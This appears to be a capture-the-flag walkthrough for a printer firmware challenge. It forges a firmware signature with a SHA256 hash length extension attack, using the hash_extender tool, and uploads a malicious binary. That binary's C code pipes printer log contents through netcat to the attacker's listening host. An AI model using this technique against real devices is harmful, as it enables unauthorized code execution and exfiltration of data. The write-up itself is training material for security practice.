https://printer.kringlecastle.com/
Objective: Get name of last printed file with .xlsx extension in /var/spool/printer.log.
Interesting reads:
  https://users.umiacs.umd.edu/~tdumitra/courses/ENEE757/Fall15/misc/gdb_tutorial.html
  https://web.eecs.umich.edu/~sugih/pointers/gdbQS.html
  https://www.youtube.com/watch?v=bWH-nL7v5F4
Hint:
  Files placed in /app/lib/public/incoming will be accessible under https://printer.kringlecastle.com/incoming/.
  Pick apart the firmware (might be Base64 encoded).
  https://www.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks


(Allow chmod to work in Windows 10 WSL)
~$ sudo nano /etc/wsl.conf


(Add following)
[automount]
options = "metadata"


(Save and shutdown WSL with CMD Prompt)
> wsl --shutdown


(Restart WSL and continue)
(Navigate to the update firmware page on the website and download the current firmware)
(It's a JSON file with the following breakdown)
firmware-export.json
  firmware: <base64>
  signature: c7075a308d5261ec1eafbe6a55c8b75f2f1a83bd668ba26f8a1953c6ed641111
  secret_length: 16
  algorithm: SHA256


(Use CyberChef to convert the base64 string into a zip archive and download it)
firmware.zip


(Get openssl code library for C++)
~$ sudo apt install libss-dev


(Clone github repo for hash length extension attack)
~$ git clone https://github.com/iagox86/hash_extender.git


(Compile)
~$ cd hash_extender
~$ gcc -o hash_extender *.c -lssl -lcrypto -Wall
  /usr/bin/ld: /tmp/cc0geZAK.o: in function `main':
  hash_extender_test.c:(.text+0x0): multiple definition of `main'; /tmp/ccXDLR3I.o:hash_extender.c:(.text+0x53b): first defined here
  collect2: error: ld returned 1 exit status


(Remove hash_extender_test.c from *.c)
~$ mv hash_extender_test.c hash_extender_test.d


(Compile again)
~$ gcc -o hash_extender *.c -lssl -lcrypto -Wall


(Run the example)
~$ ./hash_extender --data data --secret 6 --append append --signature 6036708eba0d11f6ef52ad44e8b74d5b --format md5
  Type: md5
  Secret length: 6
  New signature: 6ee582a1669ce442f3719c47430dadee
  New string: 64617461800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000005000000000000000617070656e64


(Get public IP)
~$ curl ifconfig.me


(Write C code to search the target file for xlsx, replace 127.0.0.1 with public IP from above to receive the search results)
  #include <stdlib.h>

  int main()
  {
    system("grep xlsx /var/spool/printer.log | nc 127.0.0.1 4444");
    return 0;
  }


(Compile and zip it, the binary needs to be named firmware.bin)
~$ gcc -o firmware.bin newfirm.c
~$ zip newfirm.zip firmware.bin


(Run hash extender on the zipfiles to get new)
~$ ./hash_extender --secret 16 --signature c7075a308d5261ec1eafbe6a55c8b75f2f1a83bd668ba26f8a1953c6ed641111 --format sha256 --file=firmware.zip --appendfile=newfirm.zip
  Type: sha256
  Secret length: 16
  New signature: <newSignature>
  New string: <newString>


(Put <newString> into CyberChef: [1]from hex, [2]to base64)
(Or put <newString> into hex.txt and run linux commands)
~$ xxd -r -p hex.txt file.txt
~$ base64 -w 0 file.txt > base64.txt


(Pack the content of base64.txt and <newSignature> from above into a new JSON file)


(If computer is sitting behind a home router, then set up port forwarding for port 4444 to your machine's internal IP address)
(If on a native linux machine, then start listening on port 4444)
~$ nc -nvlp 4444


(If using WSL, then start listening on port 4444 with CMD Prompt)
(For me, WSL is on a different subnet and my router port forwarding requires destination to be on the same subnet)
> ncat -nvlp 4444
  Ncat: Listening on :::4444
  Ncat: Listening on 0.0.0.0:4444


(Upload the new JSON file to the website to update firmware)
(Listening on port 4444 should get the following)
  Ncat: Connection from 34.70.241.163.
  Ncat: Connection from 34.70.241.163:47332.
  Q4 Game Floor Earnings.xlsx
  Troll_Pay_Chart.xlsx


Answer: Troll_Pay_Chart.xlsx